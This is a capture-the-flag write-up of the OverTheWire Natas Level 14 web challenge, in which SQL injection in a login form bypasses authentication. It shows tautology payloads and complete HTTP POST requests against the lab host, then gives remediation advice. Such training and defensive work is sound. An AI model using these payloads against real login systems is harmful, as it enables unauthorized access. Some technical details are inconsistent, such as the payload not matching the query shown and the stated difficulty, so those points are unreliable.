# **Natas Challenge - Level 14**

**Prepared by:** Nishanth Antony  
**Date:** November 08, 2025  
**Difficulty:** Easy    
**Category:** Web Exploitation  
**Platform:** Over The Wire  

---

## **Executive Summary**
This walkthrough documents the assessment of **Natas Level 14**, a medium-level web security challenge centered on **SQL Injection (SQLi)** in a login form. The objective was to bypass authentication and retrieve the password for **Natas Level 15**. The assessment identified a **critical SQL injection vulnerability** due to **unsanitized user input** being directly concatenated into a database query. By injecting a tautology (`OR "1"="1`), an attacker could authenticate as any user — including `natas15` — without knowing the password. This vulnerability was rated **Critical Severity** due to **complete authentication bypass** and **credential disclosure**.

**Key Findings:**
- Login form vulnerable to **classic SQL injection** in both `username` and `password` fields.
- Query: `SELECT * FROM users WHERE username = '[input]' AND password = '[input]'`
- No input sanitization or use of **parameterized queries**.
- Payload: `natas15` + `" OR "1"="1` → forces `TRUE` condition.

**Recommendations:**
- Use **parameterized queries** or **prepared statements**.
- Implement **input validation** and **allowlisting**.
- Apply **least privilege** to database users.
- Enable **WAF** with SQLi detection.

---

## **Introduction**

### **Background**
Natas is an educational web security challenge series hosted by OverTheWire, teaching progressive web vulnerabilities. Each level requires obtaining a password to advance, simulating real-world penetration testing.

### **Objective**
Exploit **SQL injection** in the login form to authenticate as `natas15` and retrieve the **Natas Level 15 password**.

### **Scope**
- **Target:** `http://natas14.natas.labs.overthewire.org`
- **Assessment Type:** Black-box (no source code)
- **Exclusions:** No brute-forcing; focus on manual SQLi

---

## **Methodology**
The assessment followed **OWASP Testing Guide** and **PTES** methodologies. Tools used: **Burp Suite** and **web browser**.

### **Step 1: Reconnaissance**
- Accessed login form with `username` and `password` fields.
- Submitted invalid credentials → error: `"Wrong password"`.
- Hypothesized backend query:
  ```sql
  SELECT * FROM users WHERE username='[user]' AND password='[pass]'
  ```

### **Step 2: Injection Testing**
- Tested `password` field with:
  - `' OR '1'='1' -- `
  - `' OR '1'='1' #`
- Observed **authentication success** with dummy username → confirmed SQLi.

### **Step 3: Targeted Exploitation**
- Set:
  - **Username:** `natas15`
  - **Password:** `" OR "1"="1`
- Intercepted request in **Burp Suite**.
- Final injected query:
  ```sql
  SELECT * FROM users WHERE username='natas15' AND password='' OR '1'='1'
  ```
  → Always evaluates to `TRUE`.

### **Step 4: Password Retrieval**
- Submitted payload → authenticated as `natas15`.
- Page displayed: **"Access granted. The password for natas15 is [redacted]"**

### **Tools Utilized**
- **Burp Suite** – Request interception and payload testing
- **Web Browser** – Form interaction

---

## **Findings**

### **Vulnerability Details**

| **Vulnerability** | **Type** | **CWE** | **Severity** | **CVSS Score** |
|-------------------|--------|--------|--------------|----------------|
| SQL Injection | Authentication Bypass | CWE-89 | Critical | 9.8 |

#### **Classic SQL Injection (CWE-89)**
- **Description:** User input is **concatenated directly** into SQL query without sanitization or parameterization.
- **Proof of Concept:**
  ```http
  POST /index.php HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=natas15&password=%22+OR+%221%22%3D%221
  ```
  → Decoded: `username=natas15&password=" OR "1"="1`

- **Resulting Query:**
  ```sql
  SELECT * FROM users WHERE username='natas15' AND password='' OR '1'='1'
  ```
  → Returns all users → first user (likely `natas15`) is authenticated.

---

## **Solution and Exploitation**

**Burp Suite Request:**
```http
POST /index.php HTTP/1.1
Host: natas14.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

username=natas15&password=%22+OR+%221%22%3D%221
```

**Response (truncated):**
```html
Access granted. The password for natas15 is <censored>
```

> **Extracted Artifact:** Password for Level 15 (redacted)

---

## **Learnings and Recommendations**

### **Key Learnings**
- **SQLi is preventable** with **parameterized queries**.
- **Error messages** like "Wrong password" leak query structure.
- **OR "1"="1** is a universal bypass when inputs are concatenated.
- **Manual testing with Burp** is highly effective for simple SQLi.

### **Recommendations**

| **Timeline** | **Action** |
|--------------|-----------|
| **Short-Term** | Migrate all queries to **prepared statements** |
| | Add input **allowlisting** (alphanumeric only) |
| **Long-Term** | 
- Use **ORMs** with built-in escaping (e.g., PDO, SQLAlchemy)
- Enable **database logging** for suspicious queries
- Conduct **SQLi-focused pentests** regularly

**Mitigation Controls:**
- **WAF** with SQLi rules (ModSecurity, Cloudflare)
- **Least privilege DB user** (no `DROP`, `CREATE`)
- **Input length limits**

---

## **Conclusion**
**Natas Level 14** demonstrates a **textbook SQL injection** flaw caused by **direct string concatenation** in database queries. The exploit required **no advanced tools** — only **logical payload crafting** and **request interception** via **Burp Suite**.

**Core Lesson:**  
> **Never concatenate user input into SQL. Always use parameterized queries.**

This vulnerability allows **complete authentication bypass**, making it one of the most dangerous web flaws. In real systems, **SQLi remains a top OWASP risk** — and **prevention is simple with modern frameworks**.

For production applications, **parameterized queries**, **input validation**, and **regular security testing** are **non-negotiable**.

---
